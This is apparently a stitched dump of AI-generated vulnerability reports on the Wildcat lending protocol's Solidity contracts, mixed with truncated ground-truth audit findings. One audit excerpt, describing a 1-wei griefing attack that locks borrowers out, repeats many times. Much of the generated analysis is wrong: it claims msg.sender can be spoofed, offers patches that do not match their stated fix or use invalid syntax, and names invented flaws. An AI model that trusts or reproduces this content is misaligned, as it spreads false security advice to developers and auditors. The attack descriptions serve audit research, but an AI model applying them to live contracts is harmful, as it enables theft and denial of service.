This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

The `nukeFromOrbit` function takes in a parameter of type `address`, which is a direct reference to an internal implementation object (i.e., a blockchain account). This reference is not properly authenticated or authorized before it is used by the contract, allowing unauthorized parties to manipulate it and perform actions as if they were legitimate users with higher privileges.\n2. The function also takes in another parameter of type `address`, which is presumably a Wildcat Sanctions Sentinel address. However, this address is not verified or authenticated before it is used by the contract, allowing an attacker to provide a malicious address that may result in unauthorized actions being taken on behalf of the legitimate user.\n3. The function also uses the `IWildcatSanctionsSentinel` interface to interact with the Wildcat Sanctions Sentinel contract. However, this interface is not properly authenticated or authorized before it is used by the contract, allowing an attacker to manipulate the sentinel's behavior and result in unauthorized actions being taken on behalf of the legitimate user.\n4. The function also uses the `revert` keyword to revert the transaction if a specific condition (i.e., `!IWildcatSanctionsSentinel(sentinel).isSanctioned(borrower, accountAddress)`) is not met. This condition may result in unauthorized actions being taken on behalf of the legitimate user if an attacker can manipulate the sentinel's behavior or the function call to `nukeFromOrbit`.\n\nIn summary, the given smart contract code is vulnerable to an IDOR vulnerability due to its lack of proper authentication and authorization mechanisms for direct references to internal implementation objects (i.e., blockchain accounts) and interfaces with other contracts.",

This is because the function checks if the calling address is sanctioned using the `isSanctioned` method of the `IWildcatSanctionsSentinel` interface, but it does not validate if the caller has the appropriate permissions to perform this action. Therefore, an attacker can exploit this vulnerability by providing a direct reference to their own account and then blocking themselves from interacting with the market, which could have serious consequences for the system's security.\n\nTo mitigate this vulnerability, it is recommended that the contract developers implement rigorous access control checks that authenticate and authorize user interactions with sensitive functions or objects, ensuring only entitled users can perform such actions. In addition, validating all received object references in function calls against the caller's permissions would help to prevent unauthorized access or transactions by users who can control the object references.",

However, both functions use a faulty comparison operator (<) instead of the correct operator (<=), which can lead to a situation where both functions fail to revert even when one function should revert. This inconsistency in state verification can enable attackers to repeatedly claim their contributions by abusing the loophole in the two functions' behavior, causing potential losses for other participants.\n\nTo mitigate this vulnerability, it is essential to correct the faulty comparison operator in the state verification functions so that their intended mutually exclusive behavior is maintained, preventing the potential exploitation of the loophole in their current implementation. Therefore, we can patch the code by changing the comparison operator from < to <= in both functions, ensuring that only one function will revert at a time.\n\nHere's an example of how the patched code could look like:\n```solidity\nfunction nukeFromOrbit(address accountAddress) external nonReentrant {\n    if (!IWildcatSanctionsSentinel(sentinel).isSanctioned(borrower, accountAddress)) {\n        revert BadLaunchCode();\n    }\n    MarketState memory state = _getUpdatedState();\n    // Patch: use <= instead of <\n    if (state.blockAccounts[accountAddress] > 0) {\n        revert BadLaunchCode();\n    }\n    _blockAccount(state, accountAddress);\n    _writeState(state);\n}\n```\nWith this patch in place, the code should be less vulnerable to the inconsistent checks in state verification functions leading to potential exploit.",

This means that a malicious actor could potentially pass in a `accountAddress` parameter that references a different user's address and bypass the authorization checks, allowing them to manipulate the contract's state or perform unauthorized actions.\n\nTo fix this vulnerability, you would need to add an additional check before calling `_blockAccount` to ensure that the `accountAddress` parameter is valid and corresponds to the user who is initiating the request. For example, you could use a check like `require(msg.sender == accountAddress)` or `require(_getUpdatedState().owner == accountAddress)`, depending on how your contract stores information about users and their addresses.\n\nIn summary, while this function has some potential security issues, it is not vulnerable to the \"Authorization Bypass Through User-Controlled Parameter\" vulnerability.",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

The function `executeWithdrawal` contains a calculation that uses the `mulDiv` method from the `MathUtils` library to calculate the amount of assets withdrawn by a user. However, this calculation uses `uint96` for the denominator and `uint256` for the numerator, which can lead to an integer overflow if the denominator is too large.\n2. The vulnerability type is Integer Overflow Attack. This attack occurs when a smart contract performs arithmetic operations with integers that exceed the maximum value of the corresponding data type, leading to unexpected results and potentially unauthorized access or funds transfer.\n3. The reason for the vulnerability is the use of `uint96` instead of `uint256` for the denominator in the calculation of the amount of assets withdrawn. This can lead to an integer overflow if the denominator is too large, which could result in the withdrawal function burning fewer shares than it should during execution. This discrepancy between the number of shares burnt and the expected number can be exploited by a malicious user to steal assets deposited by other users by depositing a large amount of assets and then withdrawing more than what should be allowed.\n\nTo mitigate this vulnerability, the smart contract code should use `uint256` for both the numerator and denominator in the calculation of the amount of assets withdrawn to ensure that the correct number of shares is burned during execution.",

However, there is no check on the amount of gas fees required to execute the withdrawal request, and thus a malicious user can submit a large number of withdrawal requests with a very small or zero amount, causing a Denial of Service (DoS) attack on the system.\n\nThe vulnerability type is \"Denial of Service via Withdrawal Queue Overloading,\" and the reason for this is that the function `executeWithdrawal` does not have any checks to ensure that the withdrawal requests are not overwhelming the system with too many requests, which can cause it to become unresponsive.\n\nTo mitigate this vulnerability, the smart contract code should include a check on the amount of gas fees required to execute the withdrawal request, and if the request requires an excessive amount of gas fees, it should be rejected or delayed until it is more reasonable.

This would reduce the risk of DoS attacks caused by queue overloading and ensure that legitimate users are able to process their withdrawals without interruption.\n\nTo mitigate this vulnerability, it may be necessary to modify the `executeWithdrawal` function by adding a minimum withdrawal amount requirement to the `if (normalizedAmountWithdrawn == 0)` statement. This would ensure that an attacker cannot submit a withdrawal request with zero or very small amounts, and would prevent them from clogging the system with these requests.\n\nIt is also important to note that the vulnerability may not be immediately apparent in the given code snippet, as it appears to include several safeguards and checks to prevent misuse of the `executeWithdrawal` function.

The vulnerability arises when a system uses a withdrawal queue to process user withdrawal requests and allows users to provide an address for fund receivers.\n2. The processing function relies on transferring tokens to the provided user address, but if a malicious user provides an address that leads to a token transfer revert, the whole queue processing gets stuck, preventing further processing of legitimate withdrawal requests.\n3. In the given smart contract code, there are several potential issues with the withdrawal queue processing logic, which could lead to the vulnerability:\na. The `executeWithdrawal` function takes an `expiry` parameter, but it is not checked if the expiration time has already passed before processing the withdrawal request. This means that a malicious user could provide an older `expiry` value to cause the queue to get stuck.\nb. The function also uses the `MathUtils.mulDiv` function to calculate the normalized amount withdrawn from the batch, which could lead to an arithmetic overflow or underflow issue if the calculation result is too large or too small. This could cause the withdrawal request to fail, but it could also cause the queue to get stuck if the error is not properly handled.\nc. The function also uses the `asset.safeTransfer` function to transfer tokens to the provided user address. If there are any issues with this function, such as a token transfer revert, the whole queue processing will be stuck and legitimate withdrawal requests will be delayed or lost.\n4. To mitigate this vulnerability, it is important to properly handle errors when processing withdrawal requests in the queue and to ensure that the expiration time for each request is checked before processing. Additionally, using a separate failed withdrawals queue as suggested in the vulnerability knowledge could help to prevent legitimate withdrawal requests from being delayed or lost due to errors with previous requests in the queue.",

If the current market conditions result in slippage exceeding the control limit, it may be impossible for users to withdraw their funds.\n\nThe vulnerability type is \"hardcoded slippage control\" because the code sets a tight slippage threshold by using MathUtils.mulDiv(), which calculates the new total withdrawn amount based on the normalized amount paid and the scaled total amount. This can be seen as hardcoding the maximum slippage that users are willing to accept, making it difficult for users to withdraw their funds if market conditions become unpredictable.\n\nThe reason for this vulnerability is that the code does not allow users to determine the maximum slippage they are willing to accept, and instead implements a hardcoded slippage control parameter that is adjustable by an operator. This can lead to unexpected behavior when market conditions become volatile, as users may not be able to withdraw their funds if the slippage threshold is exceeded.\n\nOverall, I would recommend implementing a more flexible solution that allows users to determine the maximum slippage they are willing to accept or adjusting the slippage control parameter based on market conditions.

This can be done by adding an additional argument to the `executeWithdrawal` function that specifies the maximum allowed slippage limit for each withdrawal execution. The function should then compare the calculated `newTotalWithdrawn` value with the specified maximum slippage limit and revert if it exceeds it, preventing the attacker from executing a withdrawal that would result in excessive slippage.\n\nHere is an example of how this can be implemented:\n```solidity\nfunction executeWithdrawal(\n    address accountAddress,\n    uint32 expiry,\n    uint128 maxSlippageLimit\n) external nonReentrant returns (uint256) {\n    // ...\n    if (normalizedAmountWithdrawn > maxSlippageLimit) {\n        revert SlippageControlViolated();\n    }\n    // ...\n}\n```\nThis patch will allow users to set a maximum allowed slippage limit for each withdrawal execution, preventing the attacker from executing a withdrawal that would result in excessive slippage.",

This can create a problematic situation under volatile market conditions where the slippage control parameter may prevent fund withdrawals.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

The reason for this vulnerability is that the `calculateCreate2Address` function calculates a create2 address based on the initcode hash of the dependent contract, but it does not update the initcode hash if the bytecode of the dependent contract changes. This means that if the bytecode of the dependent contract changes, the create2 address calculated by this function will be incorrect.\n\nTo mitigate this vulnerability, we can add a check to ensure that the initcode hash is updated whenever the bytecode of the dependent contract changes. We can do this by adding a `require` statement that checks if the initcode hash has changed before updating it in the `calculateCreate2Address` function.\n\nHere's an example of how we can modify the code to fix the vulnerability:\n```\nfunction calculateCreate2Address(\n    uint256 create2Prefix,\n    bytes32 salt,\n    uint256 initCodeHash\n) internal pure returns (address create2Address) {\n    assembly {\n      // Cache the free memory pointer so it can be restored\n      // at the end\n      let ptr := mload(0x40)\n\n      // Write 0xff + address to bytes 11:32\n      mstore(0x00, create2Prefix)\n\n      // Write salt to bytes 32:64\n      mstore(0x20, salt)\n\n      // Write initcode hash to bytes 64:96\n      mstore(0x40, initCodeHash)\n\n      // Calculate create2 hash for token0, token1\n      // The EVM only looks at the last 20 bytes, so the dirty\n      // bits at the beginning do not need to be cleaned\n      create2Address := keccak256(0x0b, 0x55)\n\n      // Restore the free memory pointer\n      mstore(0x40, ptr)\n    }\n\n    require(initCodeHash == getInitCodeHash(), \"initcode hash has changed\");\n}\n```\nIn this modified code, we added a `require` statement that",

This results in a wrong address being generated based on the outdated init code hash, which can cause malfunctioning of any functions or contracts that rely on the library.\n\nTo mitigate this issue, it is crucial to update the `initCodeHash` parameter to match the current state of the dependent contract before calling the `calculateCreate2Address` function. This can be done by passing in the updated init code hash as an additional argument to the function, and then using that value instead of the outdated one.\n\nHere is a potential patch for the vulnerability:\n```\nfunction calculateCreate2Address(\n    uint256 create2Prefix,\n    bytes32 salt,\n    uint256 initCodeHash,\n    uint256 updatedInitCodeHash // Added argument\n  ) internal pure returns (address create2Address) {\n    assembly {\n      // Cache the free memory pointer so it can be restored\n      // at the end\n      let ptr := mload(0x40)\n\n      // Write 0xff + address to bytes 11:32\n      mstore(0x00, create2Prefix)\n\n      // Write salt to bytes 32:64\n      mstore(0x20, salt)\n\n      // Write initcode hash to bytes 64:96\n      if (updatedInitCodeHash != null) {\n        // Use updated init code hash if it is provided\n        mstore(0x40, updatedInitCodeHash)\n      } else {\n        // Otherwise use the outdated one\n        mstore(0x40, initCodeHash)\n      }\n\n      // Calculate create2 hash for token0, token1\n      // The EVM only looks at the last 20 bytes, so the dirty\n      // bits at the beginning do not need to be cleaned\n      create2Address := keccak256(0x0b,",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

The vulnerability arises because the code relies on a user-supplied input parameter (the `msg.sender` address) for authentication and authorization checks, which can be easily tampered with or spoofed by malicious actors.\n\nTo mitigate this vulnerability, proper access control mechanisms must be implemented that do not rely on user-supplied input values. In the provided code, there are several potential issues:\n\n1. The `deployController()` function uses the `msg.sender` address to determine whether the caller is a registered borrower. However, this value can be easily modified by an attacker to gain access to the controller's functionality.\n2. The `calculateCreate2Address()` function uses the `ownCreate2Prefix` and `salt` variables, which are derived from the `msg.sender` address, as inputs for generating a unique identifier for the deployed contract. This value can also be manipulated by an attacker to gain access to the controller's functionality.\n3. The `create2WithStoredInitCode()` function uses the `controllerInitCodeStorage` variable, which is derived from the `msg.sender` address, as a parameter for deploying the contract. This value can also be manipulated by an attacker to gain access to the controller's functionality.\n4. The `registerController()` function uses the `archController` object, which is derived from the `msg.sender` address, as a parameter for registering the deployed contract. This value can also be manipulated by an attacker to gain access to the controller's functionality.\n\nTo fix these vulnerabilities, proper access control mechanisms must be implemented that do not rely on user-supplied input values and instead use secure and verifiable methods to ensure that only authorized users can access specific resources and perform certain actions. This may involve using smart contracts with more robust authentication and authorization features, such as role-based access controls or multi-factor authentication.",

The `registerController` function does not perform any form of authentication or verification on the caller, allowing an attacker to register a malicious controller that can be used to steal tokens from the market.\n\nTo mitigate this vulnerability, the code should implement proper access control mechanisms, such as using a secure and verifiable method for authenticating the caller of the `deployController` function. Additionally, the code should ensure that only authorized users can call the `registerController` function with a valid address for the new controller.\n\nIn this case, it is not possible to generate a Proof of Concept (PoC) or patch for the given vulnerability because the issue lies in the design and implementation of the `deployController` function, which relies on user-supplied input parameters to enforce access control.

The `deployController()` function in the smart contract code has a potential vulnerability because it grants unrestricted access to perform critical operations, such as deploying a controller, by using the `LibStoredInitCode` library, which allows creating a new contract instance with a provided initialization code and salt. This functionality is similar to Solidity's `create2()` function, but it has an additional parameter called `controllerInitCodeStorage`, which stores the initialization code of the controller.\n2. The vulnerability occurs when a privileged address (e.g., a registered borrower in the token ecosystem) is granted unrestricted access to deploy a new controller instance, bypassing proper checks, limitations, or time locks. This design flaw allows the privileged address to deploy a new controller without proper constraints or limitations, potentially leading to asset loss, theft, or unauthorized access to user assets.\n3. The `deployController()` function uses the `_tmpMarketBorrowerParameter` variable to store the address of the borrower who is deploying the controller. However, this variable is not used in subsequent checks and operations, allowing an attacker to manipulate its value and potentially bypass security measures that rely on it.\n4. To exploit this vulnerability, an attacker could deploy a new controller instance using the `LibStoredInitCode` library, passing the salt of their choice as the third parameter (e.g., the address of another borrower). This would allow them to gain unrestricted access to the deployed controller and potentially manipulate its state or perform critical operations without proper authorization.\n\nTherefore, based on the given smart contract code and vulnerability knowledge, I believe that there is a potential vulnerability present in the `deployController()` function, which could be exploited by an attacker to gain unauthorized access to user assets or manipulate the state of the deployed controller.",

This can lead to unexpected behavior if a malicious actor calls back into the original function or another function of the smart contract in a way that the original function's execution context is not yet finished and its state not finalized.\n\nThe reason for this vulnerability is the lack of proper reentrancy guards in the `deployController` function. The function does not check if it has been called before or if there are any ongoing transactions, which makes it vulnerable to reentrancy attacks. Additionally, the use of the `LibStoredInitCode.calculateCreate2Address` function, which is an external call, can also contribute to this vulnerability by allowing a malicious actor to call back into the original function or another function of the smart contract in a way that the original function's execution context is not yet finished and its state not finalized.\n\nTo mitigate this vulnerability, developers should consider implementing reentrancy guards, such as locking the state or using a state variable to track if the function has already been called.

If the controller has not yet been deployed, it creates a new instance and then calls registerController().\n\nThe vulnerability occurs when a malicious borrower uses the deployController() function to create a new instance of the controller contract, and then within that instance, triggers a callback function that calls back into the original deployController() function. This could potentially lead to an infinite loop of reentrancy attacks, where each subsequent call to deployController() creates a new instance of the controller contract and then triggers the callback function again, leading to an unlimited number of instances being created.\n\nTo mitigate this vulnerability, it is recommended that developers use reentrancy guards or other techniques to prevent reentrant calls within the deployedController() function.

                "poc_patch": "  Yes, this code is vulnerable to the \"Inconsistent Debt Calculation\" vulnerability. The reason for this is that in the `deployController()` function, there are two different ways of calculating the debt value: one way uses the `LibStoredInitCode.calculateCreate2Address` function and another way uses the `LibStoredInitCode.create2WithStoredInitCode` function. These functions calculate the debt value differently, leading to an inconsistent calculation of the total debt in the contract.\n\nMore specifically, the first function calculates the debt value by using a salt that is generated from the borrower's address and the controller's initialization code hash. The second function calculates the debt value by using a stored init code hash instead of a dynamic one. This leads to different results when calculating the debt value, making it vulnerable to the \"Inconsistent Debt Calculation\" vulnerability.\n\nTo mitigate this vulnerability, it is recommended to ensure that there is only one way of calculating the debt value in the contract and that all calculations are consistent with each other. This can be achieved by using a single function or method for calculating the debt value and ensuring that all calculations use the same approach.",

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

Additionally, the `enforceParameterConstraints` function is called before deploying the market, which ensures that all of the provided parameters are within the allowed ranges.\n\nThe vulnerability you described would require additional code to be executed in the context of the borrower's address, but this code does not have any such logic. Therefore, this code is not vulnerable to this particular vulnerability.",

The `msg.sender` parameter is verified against the borrower address and the address of the controller factory in the if-else statement at the beginning of the function.\n\nHowever, there are other potential vulnerabilities in the code, such as Reentrancy Attack and Unsecured Functionality. These vulnerabilities can be addressed by implementing additional security measures, such as using the OpenZeppelin contracts library to protect against reentrancy attacks and using modifiers to secure the functionality of the functions.\n\nHere is an example of how the code could be modified to address these vulnerabilities:\n```solidity\npragma solidity ^0.8.4;\n\nimport \"@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol\";\nimport \"@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol\";\n\ncontract MyContract is OwnableUpgradeable, ReentrancyGuardUpgradeable {\n    // ...\n}\n```\nIn this example, the `OwnableUpgradeable` contract provides a secure way to handle ownership and access control, while the `ReentrancyGuardUpgradeable` contract protects against reentrancy attacks by using a modifier that checks for the presence of reentry protection. This can help prevent malicious actors from exploiting vulnerabilities in the code.\n\nOverall, while the given smart contract code is not vulnerable to Incorrect Authorization Validation, it is still important to review and test the code thoroughly to identify any potential vulnerabilities and address them before deploying the code on a production blockchain.",

The function does not allow users to directly interact with other users' markets or modify their account states.\n\nLastly, the `enforceParameterConstraints` function in the code checks that all parameters are within the allowed range and throws a revert error if any of them are not.

This function ensures that the contract is deployed with the correct bytecode and initial state, as well as any other relevant parameters.\n* Finally, the function registers the newly-deployed market contract with the arch controller, and adds it to a list of controlled markets.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

        "gt": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds 